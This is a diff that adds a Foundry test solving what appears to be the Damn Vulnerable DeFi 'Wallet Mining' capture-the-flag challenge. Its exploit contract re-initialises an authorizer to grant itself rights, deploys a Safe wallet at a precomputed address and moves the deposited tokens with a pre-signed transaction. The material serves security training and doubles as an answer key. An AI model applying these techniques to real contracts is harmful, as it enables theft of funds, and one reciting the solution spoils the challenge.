@@ -123,7 +123,51 @@ contract WalletMiningChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_walletMining() public checkSolvedByPlayer {
+
+        // Safe Wallet => prepare domainSeprator, safeTxHash   
+            bytes memory execData = abi.encodeCall(token.transfer, (user, DEPOSIT_TOKEN_AMOUNT));
+            bytes32 DOMAIN_SEPARATOR_TYPEHASH = 0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218;
+            bytes32 SAFE_TX_TYPEHASH = 0xbb8310d486368db6bd6f849402fdd73ad53d316b5a4b2644ad6efe0f941286d8;           
+            bytes32 domainSeprator = keccak256(abi.encode(DOMAIN_SEPARATOR_TYPEHASH, block.chainid, USER_DEPOSIT_ADDRESS));
+            bytes32 safeTxHash = keccak256(
+                abi.encode(
+                    SAFE_TX_TYPEHASH,
+                    address(token),
+                    0,
+                    keccak256(execData),
+                    Enum.Operation.Call,
+                    0,
+                    0,
+                    0,
+                    address(0),
+                    payable(address(0)),
+                    0
+                )
+            );
         
+        // Safe Wallet => prepare execTransaction params
+            bytes memory encodeTransactionData = abi.encodePacked(bytes1(0x19), bytes1(0x01), domainSeprator, safeTxHash);
+            bytes32 txDataHash = keccak256(encodeTransactionData);
+            (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, txDataHash);
+            bytes memory signatures =  abi.encodePacked(r,s,v);
+            bytes memory execTransactionParam = 
+                abi.encodeCall( Safe.execTransaction,(
+                    address(token),
+                    0,
+                    execData,
+                    Enum.Operation.Call,
+                    0,
+                    0,
+                    0,
+                    address(0),
+                    payable(address(0)),
+                    signatures
+            ));
+        
+        // ExploitWalletMining contract => deploy to exploit 
+            new ExploitWalletMining(
+                ward, user, token, authorizer, walletDeployer, execTransactionParam);
+    
     }
 
     /**
@@ -154,5 +198,60 @@ contract WalletMiningChallenge is Test {
 
         // Player sent payment to ward
         assertEq(token.balanceOf(ward), initialWalletDeployerTokenBalance, "Not enough tokens in ward's account");
+    }
+}
+
+import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
+contract ExploitWalletMining {
+    address constant USER_DEPOSIT_ADDRESS = 0x8be6a88D3871f793aD5D5e24eF39e1bf5be31d2b;
+    uint256 constant DEPOSIT_TOKEN_AMOUNT = 20_000_000e18;
+    constructor(
+        address ward,
+        address user,
+        DamnValuableToken token,
+        AuthorizerUpgradeable authorizer,
+        WalletDeployer walletDeployer,
+        bytes memory execTransactionParam
+    ) {  
+        // Config authorizer to allow create Safe Wallet
+            address[] memory wards = new address[](1);
+            wards[0] = address(this);
+            address[] memory aims = new address[](1);
+            aims[0] = USER_DEPOSIT_ADDRESS;
+
+            authorizer.init(wards, aims);
+            
+        
+        // Prepare setupData
+            address[] memory owners = new address[](1);
+            owners[0] = address(user);
+            bytes memory setupData = abi.encodeCall(Safe.setup, (
+                owners, 
+                1, 
+                address(0),
+                "",
+                address(0),
+                address(0),
+                0,
+                payable (address(0))
+            ));
+
+        // Prepare num => // Get num as 13 as bellow script:
+            uint256 num = 13; 
+                            
+            // for (uint i = 0; i < 20; i++) {
+            //     address createdAddress = address(proxyFactory.createProxyWithNonce(address(singletonCopy),setupData, i));            
+            //     if(createdAddress == USER_DEPOSIT_ADDRESS){
+            //         num = i;
+            //     }            
+            // }
+
+        // Drop to deploy Safe Wallet 
+            walletDeployer.drop(USER_DEPOSIT_ADDRESS, setupData, num);
+            token.transfer(ward, walletDeployer.pay());
+        
+        // Safe Wallet => excTransaction to transer token to user
+        (bool success, bytes memory data) = USER_DEPOSIT_ADDRESS.call(execTransactionParam);
+        require(success, "Failed to exploit");
     }
 }
